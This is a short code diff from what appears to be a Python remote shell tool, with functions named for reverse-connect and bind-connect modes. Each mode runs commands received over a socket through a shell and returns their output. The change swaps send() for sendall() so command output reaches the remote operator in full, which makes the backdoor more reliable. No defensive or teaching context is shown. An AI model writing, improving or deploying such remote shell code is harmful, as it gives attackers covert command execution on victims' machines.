@@ -39,8 +39,8 @@ def rvrscnnct(ip,port):
                     rvrscnct.send(aq.encode('utf-8'))
                 else:
                     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
-                    rvrscnct.send(bytes(output.stdout.read()))
-                    rvrscnct.send(bytes(output.stderr.read()))
+                    rvrscnct.sendall(bytes(output.stdout.read()))
+                    rvrscnct.sendall(bytes(output.stderr.read()))
 
             except socket.timeout:
                 pass
@@ -84,8 +84,8 @@ def bndcnnct(port):
                     a.send(aq.encode('utf-8'))
                 else:
                     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
-                    a.send(bytes(output.stdout.read()))
-                    a.send(bytes(output.stderr.read()))
+                    a.sendall(bytes(output.stdout.read()))
+                    a.sendall(bytes(output.stderr.read()))
 
             except socket.timeout:
                 pass
